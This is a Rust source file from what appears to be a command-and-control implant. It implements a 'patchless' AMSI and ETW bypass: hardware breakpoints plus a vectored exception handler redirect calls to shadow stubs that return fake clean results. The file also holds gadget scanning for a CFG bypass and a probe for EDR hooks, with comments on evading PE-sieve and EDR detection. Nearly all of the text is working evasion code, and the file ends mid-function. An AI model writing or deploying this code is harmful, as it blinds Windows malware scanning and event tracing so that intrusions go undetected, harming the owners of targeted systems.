//! Hardware-breakpoint (HWBP) patchless blind — SOTA AMSI/ETW bypass.
//!
//! Sets DR0 execute breakpoint on target function's first instruction.
//! On STATUS_SINGLE_STEP, VEH handler redirects RIP to a shadow stub
//! that returns a clean value. Target function never executes.
//!
//! ## Why stealthier
//! - No `VirtualProtect` on a code page
//! - No in-memory byte modification (PE-sieve `.text` hash stays clean)
//! - Only debug register write + VEH registration
//!
//! ## VEH pattern (RF-based, single-phase)
//! 1. CPU hits DR0 → STATUS_SINGLE_STEP → VEH fires
//! 2. VEH sets RIP = shadow stub, sets Resume Flag (EFLAGS bit 16)
//! 3. RF tells CPU to skip the HWBP for ONE instruction → shadow executes
//! 4. Shadow stub sets RAX (clean return value) and ret → returns to caller
//! 5. Next call to the target fires the HWBP again (RF was one-shot)
//!
//! ## Concurrency / aliasing model (CRITICAL-6/7 fixes)
//!
//! All shared state uses atomic cells (`AtomicPtr`, `AtomicUsize`, `AtomicU8`)
//! or `Sync`-wrapped `UnsafeCell` pools, never `static mut`. The HWBP
//! subsystem is effectively single-threaded per slot: HWBPs are armed with the
//! DR7 *local-enable* (L) bit via `NtSetContextThread(NT_CURRENT_THREAD)`, so a
//! breakpoint only fires on the thread that armed it. The beacon thread is the
//! sole armer and the sole faulting thread. The VEH runs synchronously on the
//! faulting thread, so it never races another armer on the same thread.
//!
//! The atomics therefore exist primarily to satisfy Rust's aliasing model (no
//! `static mut` mutation), but they also provide a sound happens-before edge
//! for any future cross-thread HWBP use. Crucially, the VEH handler is
//! **lock-free**: it performs a single `Acquire` load per slot and never
//! returns `EXCEPTION_CONTINUE_SEARCH` because it failed to observe state —
//! the CRITICAL-7 process-kill bug. The only valid reasons for the handler to
//! pass the exception on are genuine "not our #DB" conditions (null pointers,
//! non-SINGLE_STEP code, no DR6 B-bits, no slot matching the faulting address).

#![cfg(target_os = "windows")]

// ---- Shadow type ---------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ShadowType {
    EtwEaxZero,     // xor eax,eax; ret
    AmsiInvalidArg, // mov eax,0x80070057; ret
}

// ---- CONSTANTS -----------------------------------------------------------

/// STATUS_SINGLE_STEP — hardware breakpoint / single-step exception.
/// Windows NTSTATUS 0x80000004 as signed i32.
const STATUS_SINGLE_STEP: i32 = -0x7FFF_FFFC; // 0x80000004

/// Return this from VEH to discard context changes and keep searching.
const EXCEPTION_CONTINUE_SEARCH: i32 = 0;

/// Return this from VEH to apply modified ContextRecord and resume.
const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;

/// CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64 | 0x10 = 0x100010.
const CONTEXT_DEBUG_REGISTERS: u32 = 0x0010_0010;

/// CONTEXT_CONTROL = RIP, EFlags, segment regs, etc. (0x100001 for AMD64).
const CONTEXT_CONTROL: u32 = 0x0010_0001;

/// CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS |
///                 CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS = 0x10001F
const CONTEXT_FULL_AMD64: u32 = 0x0010_001F;

const NT_CURRENT_THREAD: usize = 0xFFFF_FFFF_FFFF_FFFE;

/// EFLAGS Resume Flag — bit 16. When set, the CPU skips the next HWBP trigger
/// for exactly one instruction.
const RF_BIT: u32 = 1 << 16;

// ---- x64 CONTEXT offsets (verified against WinNT.h _CONTEXT AMD64) ------
//
//  0x030 ContextFlags   0x038 SegCs   0x044 EFlags
//  0x048 Dr0            0x050 Dr1     0x058 Dr2     0x060 Dr3
//  0x068 Dr6            0x070 Dr7
//  0x078 Rax            0x080 Rcx     0x088 Rdx     0x090 Rbx
//  0x098 Rsp            0x0A0 Rbp     0x0A8 Rsi     0x0B0 Rdi
//  0x0B8 R8  .. 0x0E8 R15   0x0F8 Rip
//  0x100 .. 0x2FF FltSave (XMM_SAVE_AREA32, 512B)
//  0x300 .. 0x49F VectorRegister[26]   0x4A0 VectorControl
//  0x4A8 .. 0x4D7 DebugControl, LastBranchTo/FromRip, LastExceptionTo/FromRip
//  TOTAL 1232 (0x4D0)

const CTX_CONTEXT_FLAGS: usize = 0x030;
const CTX_EFLAGS: usize = 0x044;
const CTX_DR0: usize = 0x048;
const CTX_DR6: usize = 0x068;
const CTX_DR7: usize = 0x070;
#[allow(dead_code)]
const CTX_RAX: usize = 0x078;
const CTX_RIP: usize = 0x0F8;

// ---- STATE (no `static mut` — CRITICAL-6 fix) ----------------------------
//
// Each HWBP slot is a fixed cell in the static `HWBP_POOL` whose data is
// mutated only by the single armer thread while the slot is in the CLAIMED
// state, and read by the VEH only while the slot is OBSERVED in the OCCUPIED
// state. Per-slot `AtomicU8` state bytes provide the Acquire/Release
// happens-before edge and satisfy the aliasing model without `static mut`.
//
// Slot state values used by the atomic protocol:
const SLOT_VACANT: u8 = 0; // free, available for add_hwbp to claim
const SLOT_OCCUPIED: u8 = 1; // armed; VEH may act on it
const SLOT_CLAIMED: u8 = 2; // add_hwbp/remove_hwbp is mid-update; VEH clears DR6 + RF

#[allow(dead_code)]
#[derive(Debug, Clone, Copy)]
struct HwbpEntry {
    target: usize,
    shadow: usize,
    original_dr7: u64,
}

/// All-zero initializer (const). Used to zero the pool at startup.
const HWBP_ENTRY_ZERO: HwbpEntry = HwbpEntry {
    target: 0,
    shadow: 0,
    original_dr7: 0,
};

/// `Sync` wrapper around a value. Safe because access to the inner cell is
/// mediated by an external protocol (the per-slot `AtomicU8` state byte with
/// Acquire/Release ordering — see `add_hwbp`/`remove_hwbp`/`hwbp_veh_handler`).
/// The wrapper lets us place mutable backing storage in a `static` without
/// `static mut`.
struct SyncUnsafeCell<T>(core::cell::UnsafeCell<T>);
unsafe impl<T> Sync for SyncUnsafeCell<T> {}
impl<T> SyncUnsafeCell<T> {
    const fn new(v: T) -> Self {
        Self(core::cell::UnsafeCell::new(v))
    }
    /// Returns a raw pointer to the inner cell. The caller is responsible for
    /// the synchronization protocol that makes the access sound.
    fn get(&self) -> *mut T {
        self.0.get()
    }
}

// SAFETY: backing cells are only mutated by the single armer thread while the
// slot's AtomicU8 is in the CLAIMED state, and only read by the VEH while the
// slot is OBSERVED in the OCCUPIED state. The OCCUPIED→CLAIMED and
// CLAIMED→OCCUPIED transitions use Acquire/Release, giving a sound
// happens-before edge. See add_hwbp/remove_hwbp/hwbp_veh_handler.
static HWBP_POOL: [SyncUnsafeCell<HwbpEntry>; 4] = [
    SyncUnsafeCell::new(HWBP_ENTRY_ZERO),
    SyncUnsafeCell::new(HWBP_ENTRY_ZERO),
    SyncUnsafeCell::new(HWBP_ENTRY_ZERO),
    SyncUnsafeCell::new(HWBP_ENTRY_ZERO),
];

/// Per-slot state: SLOT_VACANT / SLOT_CLAIMED / SLOT_OCCUPIED. The VEH
/// redirects only on OCCUPIED; a #DB whose B-bit maps to a CLAIMED slot is
/// still ours (the DR register is armed throughout the update window) and is
/// handled with a DR6 clear + Resume Flag; a VACANT slot's B-bit is foreign.
/// `add_hwbp` claims via CAS(VACANT→CLAIMED), publishes via
/// store(CLAIMED→OCCUPIED, Release); `remove_hwbp` claims via
/// CAS(OCCUPIED→CLAIMED), disarms the DR register, then stores →VACANT.
static HWBP_SLOT_STATE: [core::sync::atomic::AtomicU8; 4] = [
    core::sync::atomic::AtomicU8::new(SLOT_VACANT),
    core::sync::atomic::AtomicU8::new(SLOT_VACANT),
    core::sync::atomic::AtomicU8::new(SLOT_VACANT),
    core::sync::atomic::AtomicU8::new(SLOT_VACANT),
];

/// Live breakpoint count (also the source of truth for "remove the VEH when
/// zero"). Atomic for static-mut hygiene; writers are the add/remove paths.
static HWBP_COUNT: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);

/// VEH registration handle returned by `AddVectoredExceptionHandler`. Zero
/// (= null) when no handler is registered.
static VEH_HANDLE: core::sync::atomic::AtomicPtr<core::ffi::c_void> =
    core::sync::atomic::AtomicPtr::new(core::ptr::null_mut());

/// Shadow-stub page base (RW→RX page allocated by `init_shadow_buffer`).
/// Zero when not initialized.
static SHADOW_BUF: core::sync::atomic::AtomicPtr<u8> =
    core::sync::atomic::AtomicPtr::new(core::ptr::null_mut());

/// Post-mortem VEH diagnostic ring (hex dump of marker bytes). Race-tolerant:
/// only the VEH thread writes, and only when DIAG_ENABLED (selftest-only).
/// Wrapped in `SyncUnsafeCell` so the aliasing model is satisfied without
/// `static mut`.
static VEH_DIAG_BUF: SyncUnsafeCell<[u8; 128]> = SyncUnsafeCell::new([0u8; 128]);

/// true = VEH chain appears clean / safe to register our HWBP handler.
/// Set false by veh_chain_has_handlers() if probe detects pre-existing
/// handlers or EDR interference. Implant SHOULD check this before relying
/// on HWBP-based blind patches.
pub(crate) static VEH_SAFE: core::sync::atomic::AtomicBool =
    core::sync::atomic::AtomicBool::new(true);

/// Initialize CFG bypass subsystem. Called during bootstrap.
/// Scans for proxy gadgets in system DLLs. The gadgets are available for
/// future sync-exception proxy flows (Micro-Stager). For async HWBP
/// exceptions, CFG marking + direct VEH registration is the current path.
///
/// (The caller-spoof return-address stub scan was removed together with the
/// `caller_spoof` spoof machinery — see caller_spoof.rs module docs.)
///
/// # Safety
/// Must run after PEB-walk bootstrap. Single-threaded beacon context.
pub unsafe fn init_countermeasures() {
    // Scan for proxy gadgets (jmp rbx / call rbx in ntdll/kernelbase).
    if !crate::proxy_veh::proxy_available() {
        crate::proxy_veh::init_proxy_gadgets();
    }
    if crate::proxy_veh::proxy_available() {
        diag(b'G'); // gadget found
    }
}

/// Runtime switch for diag() file writes. Defaults OFF in production.
/// Set to true via `set_diag_enabled(true)` during selftest only.
/// `pub` (WP-C crate split): the shell's `selftests` module loads it directly
/// across the crate boundary.
pub static DIAG_ENABLED: core::sync::atomic::AtomicBool =
    core::sync::atomic::AtomicBool::new(false);

/// Enable/disable diag() file writes at runtime.
pub fn set_diag_enabled(on: bool) {
    DIAG_ENABLED.store(on, core::sync::atomic::Ordering::Release);
}

/// Write a single ASCII marker byte to C:\nyx\hwbp_diag.txt (append mode).
/// Used for step-by-step crash diagnostics during selftest ONLY.
/// **Gated behind DIAG_ENABLED** — production builds never write to disk.
pub(crate) unsafe fn diag(ch: u8) {
    if !DIAG_ENABLED.load(core::sync::atomic::Ordering::Acquire) {
        return;
    }
    let path = diag_build_path();
    let Some((cf, wf, ch_)) = diag_resolve_io_fns() else {
        return;
    };
    diag_append_byte(path.as_ptr(), ch, cf, wf, ch_);
}

/// Build the UTF-16 (null-terminated) path buffer for C:\nyx\hwbp_diag.txt.
fn diag_build_path() -> [u16; 22] {
    let mut path = [0u16; 22];
    let name = b"C:\\nyx\\hwbp_diag.txt";
    let mut i = 0;
    while i < name.len() {
        path[i] = name[i] as u16;
        i += 1;
    }
    path[name.len()] = 0;
    path
}

/// Resolve CreateFileW / WriteFile / CloseHandle (kernelbase, falling back
/// to kernel32). Returns None if any export is missing.
unsafe fn diag_resolve_io_fns() -> Option<(usize, usize, usize)> {
    let cf = nyx_implant_core::resolve::export_addr(b"kernelbase.dll", b"CreateFileW")
        .or_else(|| nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"CreateFileW"))?;
    let wf = nyx_implant_core::resolve::export_addr(b"kernelbase.dll", b"WriteFile")
        .or_else(|| nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"WriteFile"))?;
    let ch_ = nyx_implant_core::resolve::export_addr(b"kernelbase.dll", b"CloseHandle")
        .or_else(|| nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"CloseHandle"))?;
    Some((cf, wf, ch_))
}

/// Append one ASCII marker byte to the diag file: open in append mode, seek
/// to the end, write, and close. Exported addresses are raw; the fn-pointer
/// types are defined here.
unsafe fn diag_append_byte(path: *const u16, ch: u8, cf: usize, wf: usize, ch_: usize) {
    type FnCreate = unsafe extern "system" fn(
        *const u16,
        u32,
        u32,
        *mut core::ffi::c_void,
        u32,
        u32,
        *mut core::ffi::c_void,
    ) -> *mut core::ffi::c_void;
    type FnWrite = unsafe extern "system" fn(
        *mut core::ffi::c_void,
        *const u8,
        u32,
        *mut u32,
        *mut core::ffi::c_void,
    ) -> i32;
    type FnClose = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
    type FnSetFP = unsafe extern "system" fn(*mut core::ffi::c_void, i32, *mut i32, u32) -> u32;

    let create_file: FnCreate = core::mem::transmute(cf);
    let write_file: FnWrite = core::mem::transmute(wf);
    let close_handle: FnClose = core::mem::transmute(ch_);

    let h = create_file(
        path,
        4,
        3,
        core::ptr::null_mut(),
        4,
        0x80,
        core::ptr::null_mut(),
    );
    if h as isize == -1 {
        return;
    }
    if let Some(sfp) = nyx_implant_core::resolve::export_addr(b"kernelbase.dll", b"SetFilePointer")
        .or_else(|| nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"SetFilePointer"))
    {
        let set_fp: FnSetFP = core::mem::transmute(sfp);
        set_fp(h, 0, core::ptr::null_mut(), 2);
    }
    let byte = [ch];
    let mut nwritten: u32 = 0;
    let _ = write_file(h, byte.as_ptr(), 1, &mut nwritten, core::ptr::null_mut());
    close_handle(h);
}

// ---- INIT ----------------------------------------------------------------

/// Allocate and publish the shadow-stub page (RW write → RX downgrade), once
/// per process. Idempotent: returns true immediately if already initialized.
/// Returns false if the page allocation fails.
///
/// # Safety
/// Resolves `VirtualAlloc` via the PEB walk and writes machine-code stubs
/// into the freshly-allocated page. No caller preconditions beyond running in
/// a live process with kernelbase/kernel32 resolvable.
pub unsafe fn init_shadow_buffer() -> bool {
    // Fast path: already initialized this process. Acquire so we see the
    // fully-written, RX-downgraded stubs if we observe a non-null base.
    if !SHADOW_BUF
        .load(core::sync::atomic::Ordering::Acquire)
        .is_null()
    {
        return true;
    }
    let Some(page) = alloc_shadow_page() else {
        return false;
    };
    write_shadow_stubs(page);
    downgrade_shadow_page(page);
    // Publish the shadow buffer base with Release so any reader that observes
    // a non-null value also observes the fully-written, RX-downgraded stubs.
    SHADOW_BUF.store(page, core::sync::atomic::Ordering::Release);
    true
}

/// Resolve VirtualAlloc and allocate a single 0x1000-byte page as
/// PAGE_READWRITE for the shadow stubs. Returns null if unavailable.
unsafe fn alloc_shadow_page() -> Option<*mut u8> {
    let addr = nyx_implant_core::resolve::export_addr(b"kernelbase.dll", b"VirtualAlloc")
        .or_else(|| nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc"))?;
    type VAlloc = unsafe extern "system" fn(
        *mut core::ffi::c_void,
        usize,
        u32,
        u32,
    ) -> *mut core::ffi::c_void;
    let f: VAlloc = core::mem::transmute(addr);
    // MEM_COMMIT|MEM_RESERVE = 0x3000, PAGE_READWRITE = 0x04
    // Allocate as RW first, write shadow stubs, then downgrade to RX.
    let page = f(core::ptr::null_mut(), 0x1000, 0x3000, 0x04);
    if page.is_null() {
        return None;
    }
    Some(page as *mut u8)
}

/// Write the two shadow stubs into the first 64 bytes of the page.
/// Stub 0 at offset 0: xor eax,eax; ret  (ETW → return 0 = success)
/// Stub 1 at offset 8: mov eax,0x80070057; ret  (AMSI → return E_INVALIDARG)
unsafe fn write_shadow_stubs(page_u8: *mut u8) {
    // SAFETY: page is a freshly-allocated 0x1000-byte RW page we own; we only
    // touch the first 64 bytes where the two stubs live.
    let buf = core::slice::from_raw_parts_mut(page_u8, 64);
    // Shadow stub 0: xor eax,eax; ret  (ETW → return 0 = success)
    buf[0] = 0x31;
    buf[1] = 0xC0;
    buf[2] = 0xC3;
    // Shadow stub 1: mov eax,0x80070057; ret  (AMSI → return E_INVALIDARG)
    buf[8] = 0xB8;
    buf[9] = 0x57;
    buf[10] = 0x00;
    buf[11] = 0x07;
    buf[12] = 0x80;
    buf[13] = 0xC3;
}

/// Downgrade the shadow page from PAGE_READWRITE to PAGE_EXECUTE_READ (0x20).
/// Best-effort: a failed VirtualProtect resolution is ignored. Shadow stubs
/// are written once and never modified; RX is sufficient and closes the RWX
/// IOC that EDR/PE-sieve would flag.
unsafe fn downgrade_shadow_page(page: *mut u8) {
    type FnVP = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32, *mut u32) -> i32;
    let vp_addr = nyx_implant_core::resolve::export_addr(b"kernelbase.dll", b"VirtualProtect")
        .or_else(|| nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"VirtualProtect"));
    if let Some(vp) = vp_addr {
        let vp_fn: FnVP = core::mem::transmute(vp);
        let mut old_protect: u32 = 0;
        // PAGE_EXECUTE_READ = 0x20
        let _ = vp_fn(
            page as *mut core::ffi::c_void,
            0x1000,
            0x20,
            &mut old_protect,
        );
    }
}

unsafe fn shadow_addr(st: ShadowType) -> Option<usize> {
    let base = SHADOW_BUF.load(core::sync::atomic::Ordering::Acquire);
    if base.is_null() {
        return None;
    }
    match st {
        ShadowType::EtwEaxZero => Some(base as usize),
        ShadowType::AmsiInvalidArg => Some(base as usize + 8),
    }
}

// ---- VEH HANDLER ---------------------------------------------------------

/// Record a byte into VEH_DIAG_BUF as hex for post-crash inspection.
/// Uses AtomicUsize for POS to avoid data races if VEH handler is re-entered.
unsafe fn vehtag(ch: u8) {
    use core::sync::atomic::AtomicUsize;
    static POS: AtomicUsize = AtomicUsize::new(0);
    let pos = POS.load(core::sync::atomic::Ordering::Relaxed);
    if pos < 126 {
        let hex = b"0123456789abcdef";
        // SAFETY: VEH_DIAG_BUF is a 128-byte SyncUnsafeCell-backed static.
        // pos<126 and pos+1<127 so both writes are in bounds. The single VEH
        // thread is the only writer; the buffer is documented best-effort
        // post-mortem data. We obtain a raw *mut via the wrapper's protocol
        // (the VEH is the sole writer of the diag buffer).
        let base: *mut u8 = VEH_DIAG_BUF.get().cast::<u8>();
        *base.add(pos) = hex[((ch >> 4) & 0xf) as usize];
        *base.add(pos + 1) = hex[(ch & 0xf) as usize];
        POS.store(pos + 2, core::sync::atomic::Ordering::Relaxed);
    }
}

/// Read VEH_DIAG_BUF contents (for post-mortem inspection).
///
/// # Safety
/// Copies the 128-byte static diag buffer out by value; may race a concurrent
/// VEH write — the result is best-effort post-mortem data, not a consistent
/// snapshot.
pub unsafe fn read_veh_diag() -> [u8; 128] {
    // SAFETY: VEH_DIAG_BUF is a 128-byte static; we copy it out by value.
    // Concurrent writers (the VEH) may race, but the buffer is documented as
    // best-effort post-mortem data.
    core::ptr::read(VEH_DIAG_BUF.get())
}

/// Vectored Exception Handler for HWBP interception.
///
/// Pattern (RF-based, single-phase):
/// - CPU hits DR0 execute breakpoint → #DB → EXCEPTION_SINGLE_STEP
/// - VEH fires: check DR6.B0–B3 to confirm which slot triggered
/// - If match: set RIP = shadow stub, set RF (bit 16) to skip breakpoint
///   for one instruction, return EXCEPTION_CONTINUE_EXECUTION
/// - Shadow stub runs (sets RAX + ret) → returns to caller cleanly
/// - Next call to the target fires the HWBP again (RF was one-shot)
///
/// CRITICAL-7 fix: this handler is **lock-free**. It never returns
/// `EXCEPTION_CONTINUE_SEARCH` because it failed to acquire state; it returns
/// `SEARCH` only for genuinely foreign exceptions (null pointers,
/// non-`STATUS_SINGLE_STEP` codes, no DR6 B-bits, or a B-bit whose slot is
/// not armed at this faulting address). The last case — a #DB on a slot we
/// are no longer interested in, or never armed — is the OS's job to keep
/// searching; if no other handler wants it, that is correct behavior (e.g. a
/// debugger's HWBP).
///
/// # Safety
/// Invoked by the OS vectored-exception dispatcher with `ep` pointing at a
/// live `EXCEPTION_POINTERS`. Only registered via `AddVectoredExceptionHandler`
/// from this module; must never be called from Rust code directly.
#[no_mangle]
pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
        vehtag(b'V');
    } // VEH entered

    // Stage 1 — exception-code determination: null-pointer / non-SINGLE_STEP
    // / no-DR6-B-bit cases are foreign and keep the search going.
    let Some((exr, ctx)) = veh_parse_pointers(ep) else {
        return EXCEPTION_CONTINUE_SEARCH;
    };
    let Some((slot_bits, rip, fault_addr)) = veh_check_single_step(exr, ctx) else {
        return EXCEPTION_CONTINUE_SEARCH;
    };

    // Stage 2 — lock-free slot matching (CRITICAL-7 fix): on a CLAIMED slot
    // handle the #DB as a benign one-shot, on an OCCUPIED hit redirect.
    if veh_scan_slots(slot_bits, rip, fault_addr, ctx) {
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
        vehtag(b'M');
    } // no matching armed slot
    EXCEPTION_CONTINUE_SEARCH
}

/// Parse the EXCEPTION_POINTERS payload and confirm both pointers are valid.
/// Returns None (continue search) for a null `ep` or null record/context —
/// the OS's job to keep walking the chain.
unsafe fn veh_parse_pointers(ep: usize) -> Option<(*const u8, *mut u8)> {
    if ep == 0 {
        if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
            vehtag(b'0');
        }
        return None;
    }

    // EXCEPTION_POINTERS: [+0] = PEXCEPTION_RECORD, [+8] = PCONTEXT
    // SAFETY: ep is the EXCEPTION_POINTERS pointer delivered by the OS to the
    // VEH. The two pointer-sized fields at +0/+8 are the exception record and
    // context record. Both are valid for the duration of the handler.
    let ep_ptr = ep as *const u8;
    let exr = core::ptr::read_unaligned(ep_ptr as *const usize) as *const u8;
    let ctx = core::ptr::read_unaligned(ep_ptr.add(8) as *const usize) as *mut u8;
    if exr.is_null() || ctx.is_null() {
        if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
            vehtag(b'N');
        } // null pointers
        return None;
    }
    Some((exr, ctx))
}

/// Confirm this is our STATUS_SINGLE_STEP with DR6 B-bits set, and read the
/// RIP + faulting address. Returns None (continue search) for a
/// non-SINGLE_STEP code or a single-step trap with no B-bits.
unsafe fn veh_check_single_step(exr: *const u8, ctx: *mut u8) -> Option<(u64, usize, usize)> {
    // ExceptionRecord.ExceptionCode at offset +0x00 (i32)
    // SAFETY: exr points at a valid EXCEPTION_RECORD; ExceptionCode is the
    // first field.
    let code = core::ptr::read_unaligned(exr as *const i32);
    if code != STATUS_SINGLE_STEP {
        return None;
    }
    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
        vehtag(b'S');
    } // STATUS_SINGLE_STEP confirmed

    // Read DR6 — bits 0–3 indicate which slot triggered.
    // DR6 is in the CONTEXT at offset 0x068 (u64).
    // SAFETY: ctx points at a valid CONTEXT; DR6 is at offset 0x068.
    let dr6 = core::ptr::read_unaligned(ctx.add(CTX_DR6) as *const u64);

    // DR6 bit 14 (BS) = single-step. For HWBP, at least one of B0–B3 (bits 0–3)
    // should also be set. If BS is set but no B bits, it's a single-step trap
    // (e.g. from TF flag), not our HWBP.
    let slot_bits = dr6 & 0xF;
    if slot_bits == 0 {
        // No B0–B3 set → not a hardware breakpoint trigger, pass through.
        if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
            vehtag(b'b');
        } // no B bits
        return None;
    }
    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
        vehtag(b'b' + slot_bits as u8);
    } // which slot(s)

    // ContextRecord.Rip at x64 CONTEXT offset 0x0F8.
    // SAFETY: ctx points at a valid CONTEXT; Rip is at offset 0x0F8.
    let rip = core::ptr::read_unaligned(ctx.add(CTX_RIP) as *const u64) as usize;

    // ExceptionAddress is in the EXCEPTION_RECORD at offset 0x10 on x64
    // (after ExceptionCode/Flags/Record/Address fields). For an execute
    // breakpoint this equals the target address.
    // SAFETY: exr points at a valid EXCEPTION_RECORD; ExceptionAddress is at
    // offset 0x10 on x64.
    let fault_addr = core::ptr::read_unaligned(exr.add(0x10) as *const usize) as usize;
    Some((slot_bits, rip, fault_addr))
}

/// Lock-free slot scan. For each DR6 B-bit set, check whether the
/// corresponding slot is armed (OCCUPIED) and whether its target matches the
/// faulting address or RIP; redirect on hit. A #DB whose B-bit maps to a
/// slot being armed/disarmed (CLAIMED) is still ours (the DR register is
/// armed throughout the update window) and is handled by clearing DR6 +
/// setting RF — see the CLAIMED branch below. Only a VACANT slot (foreign
/// breakpoint or a stale B-bit) is genuinely not ours.
///
/// Returns true when the context has been updated for resume; false when the
/// #DB is genuinely foreign (e.g. a debugger's HWBP, or a stale B-bit) —
/// returning SEARCH for it is correct: it is NOT the CRITICAL-7 "we gave up
/// because of a lock" case.
unsafe fn veh_scan_slots(slot_bits: u64, rip: usize, fault_addr: usize, ctx: *mut u8) -> bool {
    for i in 0..4u8 {
        if (slot_bits & (1 << i)) == 0 {
            continue;
        }
        let state = HWBP_SLOT_STATE[i as usize].load(core::sync::atomic::Ordering::Acquire);
        if state == SLOT_CLAIMED {
            return veh_handle_claimed_slot(ctx);
        }
        if state != SLOT_OCCUPIED {
            // VACANT: after the disarm-before-vacant ordering in remove_hwbp,
            // a vacant slot never has an armed DR register, so a B-bit on a
            // VACANT slot is foreign (a debugger's HWBP, or a stale DR6 bit).
            // Returning SEARCH for it is correct — it is not our breakpoint.
            continue;
        }
        // SAFETY: the slot is OBSERVED OCCUPIED (Acquire above), so the
        // armer's Release store of the state byte happened-after its writes
        // to this cell. We hold the Acquire load, giving us a happens-before
        // edge to read the cell through the pool. The cell pointer is stable
        // for the lifetime of the program (HWBP_POOL is a static). The armer
        // only mutates the cell while the slot is in the CLAIMED state, which
        // we did NOT observe, so our read is of a fully-initialized entry.
        let cell_ptr: *const HwbpEntry = HWBP_POOL[i as usize].get();
        let e: HwbpEntry = core::ptr::read_volatile(cell_ptr);
        if fault_addr == e.target || rip == e.target {
            // ====== HIT: redirect to shadow stub ======
            veh_redirect_to_shadow(ctx, e.shadow);
            return true;
        }
    }
    false
}

/// Handle a #DB on a slot mid-arm / mid-disarm (CRITICAL-7 sequel): the DR
/// register for this slot IS armed (add_hwbp arms the register BEFORE it
/// publishes OCCUPIED; remove_hwbp disarms only AFTER it claims the slot),
/// so this #DB is genuinely OURS — the target address was executed inside
/// the arming/disarming window. We must NOT return EXCEPTION_CONTINUE_SEARCH:
/// no other handler knows this breakpoint, so the exception would go
/// unhandled and terminate the process. Handle it as a benign one-shot:
/// clear DR6 (stale bits misidentify the next trap) and set the Resume Flag
/// so the CPU skips the breakpoint for exactly one instruction. During
/// arming the next execution re-traps and, by then, the slot is OCCUPIED and
/// the VEH redirects; during disarming the register is cleared before VACANT
/// is published, so traps stop. Returns true (resume execution).
unsafe fn veh_handle_claimed_slot(ctx: *mut u8) -> bool {
    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
        vehtag(b'C');
    } // claimed-slot #DB handled
    veh_clear_dr6_set_rf(ctx);
    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
        vehtag(b'c');
    } // resuming
    true
}

/// Stage 3 — RIP redirection on a slot hit: point RIP at the shadow stub
/// (xor eax,eax;ret or mov eax,...;ret), clear DR6, set the Resume Flag, and
/// request CONTEXT_DEBUG_REGISTERS + CONTEXT_CONTROL so the OS applies all
/// the changes on resume.
unsafe fn veh_redirect_to_shadow(ctx: *mut u8, shadow: usize) {
    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
        vehtag(b'R');
    } // redirecting

    // Set RIP to shadow stub (xor eax,eax;ret or mov eax,...;ret).
    // SAFETY: ctx is a valid CONTEXT; Rip is at offset 0x0F8.
    core::ptr::write_unaligned(ctx.add(CTX_RIP) as *mut u64, shadow as u64);

    veh_clear_dr6_set_rf(ctx);

    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
        vehtag(b'X');
    } // done
}

/// Clear DR6 (Windows doesn't auto-clear it) and set the Resume Flag
/// (EFLAGS bit 16) so the CPU skips the HWBP trigger for exactly one
/// instruction. Requests CONTEXT_DEBUG_REGISTERS (apply the DR6 clear) +
/// CONTEXT_CONTROL (apply EFlags) so the OS applies all changes on resume.
unsafe fn veh_clear_dr6_set_rf(ctx: *mut u8) {
    // SAFETY: ctx is a valid CONTEXT; DR6 is at offset 0x068.
    core::ptr::write_unaligned(ctx.add(CTX_DR6) as *mut u64, 0);
    // SAFETY: ctx is a valid CONTEXT; EFlags is at offset 0x044.
    let eflags = core::ptr::read_unaligned(ctx.add(CTX_EFLAGS) as *const u32);
    core::ptr::write_unaligned(ctx.add(CTX_EFLAGS) as *mut u32, eflags | RF_BIT);
    // SAFETY: ctx is a valid CONTEXT; ContextFlags is at offset 0x030.
    let flags = core::ptr::read_unaligned(ctx.add(CTX_CONTEXT_FLAGS) as *const u32);
    core::ptr::write_unaligned(
        ctx.add(CTX_CONTEXT_FLAGS) as *mut u32,
        flags | CONTEXT_DEBUG_REGISTERS | CONTEXT_CONTROL,
    );
}

// ---- VEH CHAIN PROBE ------------------------------------------------------

/// Dummy VEH handler — always continues search.
/// Used by `veh_chain_has_handlers` as a transient probe.
unsafe extern "system" fn probe_veh_handler(_ep: usize) -> i32 {
    EXCEPTION_CONTINUE_SEARCH // 0 — keep walking the chain
}

/// Probe whether the VEH chain has pre-existing handlers or EDR interference.
///
/// Strategy:
/// 1. Register a transient dummy handler via `AddVectoredExceptionHandler(1,…)`.
/// 2. Immediately remove it via `RemoveVectoredExceptionHandler`.
/// 3. If either call fails (null handle or zero return), the chain is likely
///    compromised — an EDR may be hooking the VEH API or already occupying it.
///
/// Returns `true` if the chain appears compromised (unsafe to register).
/// Returns `false` if the probe was clean (safe to register).
///
/// On failure, also sets `VEH_SAFE` to `false`.
pub(crate) fn veh_chain_has_handlers() -> bool {
    unsafe {
        let Some(add) = resolve_add_veh() else {
            return true;
        };
        let Some(rm) = resolve_remove_veh() else {
            return true;
        };
        probe_veh_chain(add, rm)
    }
}

/// Resolve AddVectoredExceptionHandler. On failure, marks the chain unsafe
/// (`VEH_SAFE = false`) and returns None — the caller reports the chain as
/// compromised.
unsafe fn resolve_add_veh() -> Option<
